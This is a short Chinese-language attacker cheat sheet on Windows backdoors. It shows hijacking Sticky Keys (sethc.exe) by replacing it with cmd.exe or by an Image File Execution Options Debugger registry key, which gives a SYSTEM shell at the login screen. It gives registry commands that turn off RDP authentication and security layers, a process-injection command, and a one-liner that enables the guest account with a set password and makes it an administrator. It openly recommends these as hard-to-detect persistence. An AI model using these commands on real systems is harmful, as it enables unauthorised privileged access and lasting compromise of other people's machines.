## 劫持sethc.exe（粘滞键）

### sethc介绍

sethc就是windows中的粘滞键。他的启用方式是按5下shift键，windows就会去找c:\windows\system32\下面的sethc.exe程序，并执行它。那么这个时候，细心的我们就应该发现，cmd也是在这个目录下。系统是通过检索sethc这个名字来启用的，那我们是否可以将cmd改成sethc，从而使本该调用sethc的时候，“错误”的调用了cmd。这样，就形成了一个漏洞。而且这个快捷方式只要不被禁用，甚至在电脑没有进入系统桌面之前都可以被调用，且此时为system权限，因为这个东西比较隐蔽，所以很多人都忽视了它，正因为如此，它的危害就显而易见了。可以留做后门，平常木马后门容易被发现，或者提权困难的情况下，使用sethc替换后门是不错的选择。

## sethc权限

我们打开sethc.exe文件的属性，发现在默认情况下是属于trustedtnstaller所有，不管是普通用户还是administrator都没有权限对它进行编辑的。trustedinstaller是一个安全机制，权限比administrator管理权高，但比system低。我们可以通过选择安全，高级中把从父项继承的√取消掉。如图我的已经修改了。

## 相关命令

```powershell
# sethc.exe 劫持
# 1. 替换exe
cd c:\windows\system32
move sethc.exe sethc1.exe
copy cmd.exe sethc.exe 
# 2. 注册表劫持
# reg add 是向注册表添加记录
# HKLM 是 HKEY_LOCAL_MACHINE 的缩写
# Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序
# 随后通过 /v 来指定键名，这个键名 debugger 是固定的
# 然后通过 /t 来指定类型，即 REG_SZ 字符串类型
# 最后通过 / d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"

# 开启rdp
# 第一个是设置远程桌面连接的用户鉴定选项的状态。分为“0”和“1”两种状态。
# “0” 代表进行远程桌面前不需要用户身份验证，这时输入用户名不输入密码点连接会直接到远程桌面锁屏的那个界面
# “1” 代表需要进行用户身份验证，当我们输入用户名不输入密码直接点击连接会提示身份验证错误
# 所以设置为0我们可以直接到目标机的锁屏，然后直接调用cmd。
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
# 第二个是设置远程桌面连接的安全层，有三个参数：“0”“1”“2”。
# “0” 就是连接前使用rdp协议进行身份验证
# “1” 是指在连接前两端协商来进行身份验证
# “2” 是使用tls协议来进行
# 所以设置为0我们可以直接到目标机的锁屏，然后直接调用cmd。
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0
```

### 进程注入

```
inject <pid> <x86/x64> <listener>
```

## 添加用户

```powershell
cmd.exe /c \"net user guest /active:yes && net localgroup administrators guest /add && net user guest Qweqwe123\"
```

